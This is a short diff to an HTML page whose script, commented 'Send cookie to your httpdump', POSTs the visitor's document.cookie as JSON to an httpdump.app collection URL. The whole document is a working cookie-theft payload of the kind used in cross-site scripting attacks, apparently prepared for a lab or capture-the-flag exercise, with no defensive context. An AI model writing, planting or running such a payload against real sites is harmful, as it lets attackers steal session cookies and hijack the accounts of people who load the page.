@@ -1,6 +1,10 @@
+<html>
 <script>
+// Send cookie to your httpdump
 fetch('https://httpdump.app/dumps/83a81e26-b1db-4c2f-891f-7befa27c87da', {
     method: 'POST',
-    body: document.cookie
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({cookie: document.cookie})
 });
 </script>
+</html>
